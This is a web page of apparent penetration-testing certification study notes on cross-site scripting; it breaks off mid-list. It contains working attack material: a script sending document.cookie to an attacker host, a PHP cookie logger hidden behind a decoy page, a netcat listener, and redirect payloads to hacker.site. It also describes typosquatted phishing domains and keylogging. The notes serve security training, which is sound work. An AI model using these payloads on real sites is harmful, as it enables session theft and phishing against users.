<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>3 - Cross-site scripting (XSS) |</title>
<meta name="description" content="How to discover and exploit a XSS vulnerability ">


  <meta name="author" content="Nullified">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="">
<meta property="og:title" content="3 - Cross-site scripting (XSS)">
<meta property="og:url" content="http://localhost:4000/notes/ewptx/xss/">


  <meta property="og:description" content="How to discover and exploit a XSS vulnerability ">



  <meta property="og:image" content="http://localhost:4000/assets/images/main/header2.jpg">





  <meta property="article:published_time" content="2023-11-29T00:00:00+06:00">





  

  


<link rel="canonical" href="http://localhost:4000/notes/ewptx/xss/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "john",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
        
        <a class="site-title" href="/">
          
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/menu">Menu</a>
            </li><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
  
    

    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header2.jpg');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          3 - Cross-site scripting (XSS)

        
      </h1>
      
        <p class="page__lead">How to discover and exploit a XSS vulnerability
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  12 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  
  
    
      
      
      
      
    
    
      

<nav class="nav__list">
  
  <input id="ac-toc" name="accordion-toc" type="checkbox" />
  <label for="ac-toc">Toggle menu</label>
  <ul class="nav__items">
    
      <li>
        
          <span class="nav__sub-title">Posts</span>
        

        
        <ul>
          
            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
          
            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
          
            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
          
            <li><a href="">────────────────</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">Notes</span>
        

        
        <ul>
          
            <li><a href="/notes/ejpt/">eJPT</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/ecppt/">eCPPTv2</a></li>
          
            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
          
            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
          
            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
          
            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
          
            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
          
            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/pnpt/">PNPT</a></li>
          
            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
          
            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
          
            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
          
            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
          
            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
          
            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/eewptx/">eWPTXv2</a></li>
          
            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
          
            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
          
            <li><a href="/notes/ewptx/xss/" class="active">- Cross-site scripting (XSS)</a></li>
          
            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
          
            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
          
            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
          
            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
          
            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
          
            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
          
            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
          
            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
          
            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
          
            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="">Active Directory Exploitation</a></li>
          
            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
          
            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
          
            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crtp/">CRTP</a></li>
          
            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
          
            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
          
            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
          
            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
          
            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crte/">CRTE</a></li>
          
            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
          
            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
          
            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">My CVEs</span>
        

        
        <ul>
          
            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
          
            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
          
        </ul>
        
      </li>
    
  </ul>
</nav>

    
  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="3 - Cross-site scripting (XSS)">
    <meta itemprop="description" content="How to discover and exploit a XSS vulnerability">
    <meta itemprop="datePublished" content="2023-11-29T00:00:00+06:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#xss">XSS</a>
    <ul>
      <li><a href="#definition">Definition</a></li>
      <li><a href="#xss-attacks">XSS Attacks</a></li>
      <li><a href="#defacements">Defacements</a></li>
      <li><a href="#phising">Phising</a></li>
      <li><a href="#keylogging">Keylogging</a></li>
      <li><a href="#network-attacks">Network Attacks</a></li>
      <li><a href="#bypass">Bypass</a></li>
      <li><a href="#exotic-xss-vectors">Exotic XSS Vectors</a></li>
      <li><a href="#create-an-external-ip-to-get-requests">Create an external IP to get requests</a></li>
      <li><a href="#notes-from-video">Notes from Video</a></li>
      <li><a href="#lab---11-levels-to-bypass-xss">Lab - 11 Levels to Bypass XSS</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<h1 id="xss">XSS</h1>

<h2 id="definition">Definition</h2>
<ul>
  <li>XSS occurs when a browser renders untrusted content in a trusted environment.</li>
  <li>If the content contains dynamic languages such as HTML, JavaScript and others, the browser may execute the untrusted code.</li>
</ul>

<p>The 4 types:</p>

<h3 id="reflected-xss">Reflected XSS</h3>
<p>It occurs when untrusted user data is sent to a web application and its immediately echoed back into the untrusted content. Then, as usual, the browser receives the code from the web server response and renders it.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nv">$name</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span><span class="cp">?&gt;</span>
Welcome <span class="cp">&lt;?=</span><span class="nv">$name</span><span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="persistent-xss">Persistent XSS</h3>
<ul>
  <li>Rather than the malicious input being directly reflected into the response, its stored within the web application</li>
  <li>Once this occurs, its then echoed somewhere else within the web application and might be available to all visitors.</li>
  <li>In this scenario, both databases and file system fiels are the target data storage mechanisms.</li>
</ul>

<h3 id="dom-xss">DOM XSS</h3>
<p>Its a form of XSS that exists only within client-side code (typically JavaScript)</p>

<p>It does not reach server-side code. This is the reason why this flaw is also known as <strong>Type-0</strong> or <strong>Local XSS</strong>.</p>

<p>Information we can get are the URL, history, cookies, local storage etc.</p>

<p>There is two keywords: <em>sources</em> and <strong>sinks</strong>.</p>

<blockquote>
  <p>In software, data flow can be thought as in water flow in aqueduct systems which starts from natural sources and ends to sinks. In software security the sources are to be considered starting points where untrusted input data is taken by application.</p>
</blockquote>

<blockquote>
  <p>Sinks are meant to be the points in the flow where data depending from sources is used in a potentially dangerous way resulting in loss of Confidentiality, Integrity or Availability.</p>
</blockquote>

<p>→ Moreover DOM XSS: https://code.google.com/p/domxsswiki/</p>

<h3 id="universal-xss">Universal XSS</h3>
<ul>
  <li>Aka UXSS</li>
  <li>it dows not leverage the flaws against web applications but the browser, its extensions or its plugins.</li>
</ul>

<h2 id="xss-attacks">XSS Attacks</h2>

<h3 id="cookie-gathering">Cookie Gathering</h3>
<ul>
  <li>The main techniques to keep track of user session is by using HTTP cookies.</li>
  <li>Sometimes these cookies contain information such as username, password, and other application related information.</li>
</ul>

<p>3 steps:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="nc">Script</span> <span class="nc">Injection</span>
<span class="o">-</span> <span class="nc">Cookie</span> <span class="nc">Recording</span>
<span class="o">-</span> <span class="nc">Logging</span>
</code></pre></div></div>

<h3 id="script-injection">Script Injection</h3>
<p>Inject the malicious payload that will send the stolen cookies to our controlled CGI
Accessing Cookies:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">var</span> <span class="n">accessibleCookies</span> <span class="o">=</span> <span class="n">document</span><span class="mf">.</span><span class="n">cookie</span><span class="p">;</span>
</code></pre></div></div>

<p>AccessibleCookies is a string containing a semicolon-separated list of cookies in key=value pairs. The result contains cookies without the HTTPOnly attribute. On HTTP connections, only cookies without the SECURE attribute set are contained in the result.</p>

<p>Stealing Cookies
To steal cookies, we need to send the document.cookie content to something we can control, using a simple script like:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nc">Image</span><span class="p">()</span><span class="mf">.</span><span class="n">src</span><span class="o">=</span><span class="s2">"http://kali.site/C.php?cc="</span><span class="o">+</span><span class="nf">escape</span><span class="p">(</span><span class="n">document</span><span class="mf">.</span><span class="n">cookie</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/images/posts/ewptx/51.png" alt="Alt text" class="align-center" /></p>

<p><img src="/assets/images/posts/ewptx/52.png" alt="Alt text" class="align-center" /></p>

<p>Cookie Recording &amp; Logging:</p>

<p>Once the client-side has performed the request to our controlled CGI, its time to handle the request and manage the parameter sent.</p>

<p>Here, we define which information to collect, how to store it and the action to perform once this valuable information is obtained.</p>

<p>Lets suppose we have our PHP script C.php listening on our kali machine</p>

<p>A basic example is to store the GET[‘cc’] content in a file.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">#turn off all error reporting</span>
<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cc'</span><span class="p">];</span> <span class="c1">#request to log</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="s1">'_cc_.txt'</span><span class="p">;</span> <span class="c1">#the log file</span>
<span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"a"</span><span class="p">);</span> <span class="c1"># open log file in append mode</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span><span class="nv">$cookie</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span> <span class="c1"># append the cookie</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span> <span class="c1">#append the cookie</span>
<span class="k">echo</span> <span class="s1">'&lt;h1&gt;Page Under Construction&lt;/h1&gt;'</span><span class="p">;</span> <span class="c1">#trying to hide suspects</span>
<span class="o">&gt;</span>
</code></pre></div></div>

<p><img src="/assets/images/posts/ewptx/53.png" alt="Alt text" class="align-center" /></p>

<p>Once we obtain the desired cookie, we can do several operations in addition to logging.
Some examples are as follows:</p>
<ul>
  <li>a request to an API that requires the stolen cookies (impersonation)</li>
  <li>notify the attacker via email</li>
</ul>

<blockquote>
  <p>simple solution is to use netcat</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netcat <span class="nt">-lvvp</span> 80
&lt;script&gt; new Image<span class="o">()</span>.src<span class="o">=</span><span class="s2">"kali ip"</span>+escape<span class="o">(</span>document.cookie<span class="o">)</span><span class="p">;</span> &lt;/script&gt;
</code></pre></div></div>

<h3 id="bypassing-httponly-flag">Bypassing HTTPOnly Flag</h3>
<p>This flag forces the browser to handle the cookie only when trasmitting HTTP request; thus; For client-side scripting languages (IE: JavaSCript), these cookies are practically invisible.</p>

<h3 id="cross-site-tracking-xst">Cross-Site Tracking (XST)</h3>
<p>TRACE connection:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl &lt;victim.site&gt; <span class="nt">-X</span> TRACE <span class="nt">-H</span> <span class="s2">"Test: test-header"</span>
</code></pre></div></div>

<p>In JavaScript, there is the <strong>XMLHttpRequest</strong> object that provides an easy way to retrieve data from a URL.</p>

<blockquote>
  <p>this technique is very old and consequently modern browsers BLOCK the HTTP TRACE method in XMLHttpRequest and in other scripting languages and libraries such as <em>JQuery</em>, <em>Silverlight</em>, <em>Flag/ACtionScript</em>, etc.</p>
</blockquote>

<p><img src="/assets/images/posts/ewptx/54.png" alt="Alt text" class="align-center" /></p>

<h3 id="cve2012-0053-aka-apache-httponly-cookie-disclosure">CVE:2012-0053 aka Apache HTTPOnly Cookie Disclosure</h3>
<ul>
  <li>Another way to access HTTPOnly cookies is exploiting web server bugs</li>
  <li>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0053</li>
  <li>This example is related to the infamous Apace HTTP Server 2.2.x through 2.2.21
Its possible to create and then sned a burst of large cookies that then generates the 400 error page. We can then just read the response that will definitely contain the HTTPOnly cookies.</li>
</ul>

<p>PoC = https://gist.github.com/pilate/1955a1c28324d4724b7b</p>

<ul>
  <li>In BeEF there is a module named <strong>Apache Cookie Disclosure</strong>, which is available under the <strong>Exploits</strong> section.</li>
</ul>

<h3 id="beef-tunneling-proxy">BeEF Tunneling Proxy</h3>
<p>An alternative to stealing protected cookies is to use the victim browser as a proxy.</p>

<ul>
  <li>We can do this by using <strong>Tunneling Proxy</strong> in BeEF. This feature allows you to tunnel requests through the hooked browser.</li>
  <li>Its also effective against web developer protection techniques such as using multiple validations like <strong>User-Agent</strong>, <strong>IP</strong>, custom headers, etc.</li>
</ul>

<h2 id="defacements">Defacements</h2>
<ul>
  <li>Instead of injecting malicious code that runs behind the scenes and performs evil operations (cookie stealing) with this attack method the malicious intent is to give a precise message or misleading information to users of the attacked applications.
Examples:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.xssed.com/news/110/Norton_Update_Center_critical_XSS_vulnerability/
http://news.netcraft.com/archives/2008/04/24/clinton_and_obama_xss_battle_develops.html
http://zerosecurity.org/2013/01/mit-hacked-defaced-by-anonymous
</code></pre></div>    </div>
  </li>
</ul>

<h3 id="virtual-defacement">Virtual Defacement</h3>
<ul>
  <li>Exploit a XSS flaw that does not modify the content hosted on the target web application.</li>
  <li>Typically, this is what happens when abusing Reflected XSS flaws.</li>
</ul>

<h3 id="persistent-defacement">Persistent Defacement</h3>
<ul>
  <li>WHen a defacement becomes persistent. In this case the attacked page is modigied permanently and, despite the Virtual Defacement type here, the attacker does not need to fool users into visiting a crafted URL.</li>
</ul>

<h2 id="phising">Phising</h2>
<ul>
  <li>The act of attempting to acquire sensitive information such as usernames, passwords, and credit card details (and sometimes, indirectly, money) by masquerading as a trustworthy entity in an electronic communication.</li>
</ul>

<p>Fundamental steps:</p>
<ul>
  <li>Create a fake website that will contain the malicious code the attacker wants to execute.</li>
</ul>

<p>Basic Example:</p>
<ul>
  <li>Perform a XSS phishing, alter the <strong>action</strong> attribute of the &lt;FORM&gt; tag in order to hijack the submitted form input.</li>
</ul>

<blockquote>
  <p>We are assuming that the XSS flaw page is in the same page of the stolen form; if its not, we need to leverage the XSS flaw to access the form we have targeted (example: opening the page)</p>
</blockquote>

<blockquote>
  <p>IN this case the defenses fail because the phishing website is the actual website.</p>
</blockquote>

<h3 id="cloning-a-website">Cloning a Website</h3>
<p>If we want to clone an existing website or clone and inject a payload, then we may use one of the following tools:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GNU Wget
BeEF
SET site cloner
</code></pre></div></div>

<h3 id="choosing-a-domain-name">Choosing a Domain Name</h3>
<ul>
  <li>Once the website has been cloned, you should consider where you will host the phishing site.</li>
  <li>The more the domain name is similar to the victims domain name the better.</li>
  <li>Add typos and playing with characters variations is the best call.</li>
</ul>

<p>Tool:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URLCrazy
usage: urlcrazy &lt;www.google.com&gt;
</code></pre></div></div>

<h2 id="keylogging">Keylogging</h2>
<ul>
  <li>Sometimes is helpful to know what our victim is typing during their activity on a targeted website.</li>
  <li>We need client-side code that captures the keystrokes and server-side code that stores the keys sent.</li>
</ul>

<h3 id="javascript-example">JavaScript Example</h3>

<p><img src="/assets/images/posts/ewptx/55.png" alt="Alt text" class="align-center" /></p>

<p>The most known frameworks also includes a keylogging feature:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Metaslpoit - http_javascript_keylogger
BeEF - event logger
</code></pre></div></div>

<h3 id="keylogging-with-metasploit">Keylogging with Metasploit</h3>
<p>auxiliary/server/capture/http_javascript_keylogger</p>

<ul>
  <li>it creates the JS payload and start the listening server</li>
  <li>this module creates a DEMO PAGE For us. Just enable the DEMO option to with set DEMO true.</li>
</ul>

<h3 id="keylogging-with-beef">Keylogging with BeEF</h3>
<ul>
  <li>its the upgraded version of the previous examples.</li>
  <li>These logs are available For the administration user interface in the Logs tab, while withing the console they are printed as they occur.</li>
</ul>

<h2 id="network-attacks">Network Attacks</h2>
<ul>
  <li>At a network layer we can obtain access to varieties of services that would otherwise be unavailable over HTTP.</li>
  <li>Like email services, fax and print services, internal web servers and more</li>
</ul>

<h3 id="ip-detection">IP Detection</h3>
<ul>
  <li>Retrieve as much information as possible</li>
</ul>

<p>My Address Java Applet - http://reglos.de/myaddress/MyAddress.html //user interaction is needed</p>

<ul>
  <li>its usually blocked, u need to lower java security and allow the page to run the application</li>
</ul>

<p>HTML5 WebRTC feature:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipcalf - http://net.ipcalf.com/
improved version -  https://hacking.ventures/local-ip-discovery-with-html5-webrtc-security-and-privacy-risk/ 
<span class="c"># this scan local ips and other alive hosts </span>
<span class="c"># its not supported by all browser, IE and safari do not support this.</span>
</code></pre></div></div>

<h3 id="subnet-detection">Subnet Detection</h3>
<p>The browser Hackers handbook: http://browserhacker.com/code/Ch10/index.html</p>

<p><strong>Identifying Internal Network Subnets</strong></p>

<p>Steps:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Start from a <span class="nb">set </span>of most common default gateway IP ranges
- Test a subset of probable IPs <span class="k">in </span>the subnet
- Results... <span class="k">in </span>red the discovered hosts
</code></pre></div></div>

<h3 id="ping-sweeping">Ping Sweeping</h3>
<p>Two approaches:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Java Applets
- The same approach used before to detect subnets
</code></pre></div></div>

<p>Instead of testing only a couple of IPs, we will check the entire subnet.</p>

<p><strong>XHR</strong> technique:</p>
<ul>
  <li>if a response arrives in a short amount of time then the host is alive; otherwise, after a defined threshold, the host is down.</li>
  <li>Since this approach is time based, network latencies, browser networking characteristics, etc. may increase the number of false positives.</li>
</ul>

<h3 id="port-scanning">Port Scanning</h3>
<p>PDP portscan in JS: http://web.archive.org/web/20100626084549/http:/www.gnucitizen.org/static/blog/2006/08/jsportscanner.js</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- PDP uses &lt;img&gt; tag and DOM events to detect whether a port on a specific host is opened or closed.
- The idea is to <span class="nb">set </span>the image <span class="nb">source </span>on a specific port of the target host <span class="k">in </span>order to <span class="nb">let </span>the browser know to perform a TCP connection to the defined port and <span class="k">then </span>analyze the events.

- with Cross-Origin Resource Sharing <span class="o">(</span>CORS<span class="o">)</span> and WebSocket, both of which are new HTML5 features, its also possible to scan networks and ports.
- JS-Recon  <span class="o">=</span> http://web.archive.org/web/20120308180633/http:/www.andlabs.org/tools/jsrecon/jsrecon.html
<span class="c"># a network reconnaissance tool writen in JavaScript</span>
</code></pre></div></div>

<h3 id="self-xss">Self-XSS</h3>
<ul>
  <li>In this attack, the goal is to trick victims into pasting malicious code into a browser URL bar or console.</li>
</ul>

<p>Example: http://www.zdnet.com/facebook-flooded-with-porn-spam-3040094432/</p>

<h2 id="bypass">Bypass</h2>

<h3 id="browsers-based-on-chromium-strip-the-javascript-part">browsers based on Chromium strip the javascript part.</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="nx">So</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">copy</span> <span class="nx">and</span> <span class="nx">paste</span> <span class="o">&lt;</span><span class="nx">enter</span><span class="o">&gt;</span>
<span class="err">#</span> <span class="nx">Or</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">drag</span> <span class="nx">and</span> <span class="nx">drop</span> 
<span class="nx">JavaScript</span><span class="p">:</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Self-XSS</span><span class="dl">'</span><span class="p">)</span>

<span class="err">#</span> <span class="nx">Using</span> <span class="nx">Data</span> <span class="nx">Scheme</span> <span class="nx">works</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">same</span> <span class="nx">methods</span>
<span class="nx">data</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Self-XSS</span><span class="dl">'</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
<span class="err">#</span> <span class="nx">We</span> <span class="nx">can</span> <span class="nx">encode</span> <span class="nx">the</span> <span class="nx">script</span> <span class="kd">with</span> <span class="nx">Base64</span><span class="p">.</span> <span class="nx">It</span> <span class="nx">works</span> <span class="nx">the</span> <span class="nx">same</span><span class="p">.</span>
</code></pre></div></div>

<h3 id="based-on-firefox">Based on Firefox</h3>
<ul>
  <li>Mozilla Firefox disallows access to the security context of the currently loaded page if that access is attempted by javascript or data-scheme URIs entered directly into the browsers location bar.</li>
  <li>Anyway its possible to execute redirects or other malicious operations with both schemes.</li>
</ul>

<p>Redirect to hacker.site with <strong>javascript</strong> scheme:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">javascript</span><span class="p">:{</span><span class="k">this</span><span class="p">.</span><span class="nb">window</span><span class="o">=</span><span class="dl">'</span><span class="s1">&lt;script&gt;document.location="http://hacker.site"&lt;/script&gt;</span><span class="dl">'</span><span class="p">};</span>
</code></pre></div></div>

<p>Redirect to hacker.site with <strong>data</strong> scheme:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">data</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://hacker.site</span><span class="dl">"</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h3 id="access-objects-in-the-dom-via-bookmarks">Access objects in the DOM via bookmarks</h3>
<p>in images:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Create a bookmark: Alert cookies <span class="o">&gt;</span> javascript:alert<span class="o">(</span>document.cookie<span class="o">)</span>
2. Click
3. Browser execute JavaScript
<span class="c"># this bookmarks technique is also valid in browsers like Chromium, Internet Explorer and Safari</span>
</code></pre></div></div>

<h3 id="internet-explorer">Internet Explorer</h3>
<ul>
  <li>data scheme is limited, but javascript is available</li>
</ul>

<p>The only limit is similar to Chormium browsers, it will strip any leading <strong>javascript:</strong> from the pasted text before inserting into the search bar:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">javascript</span><span class="p">:</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://hacker.site</span><span class="dl">'</span>
</code></pre></div></div>

<h3 id="safari">Safari</h3>
<ul>
  <li>Denies javascript from the Smart Search Field but is allowed within <strong>bookmarks</strong></li>
  <li>The <strong>data scheme</strong> is allowed too</li>
</ul>

<h3 id="noscript-security-suite">NoScript Security Suite</h3>
<ul>
  <li>Its a firefox extension, adds an additional security layer blocking all javascript and data URIs</li>
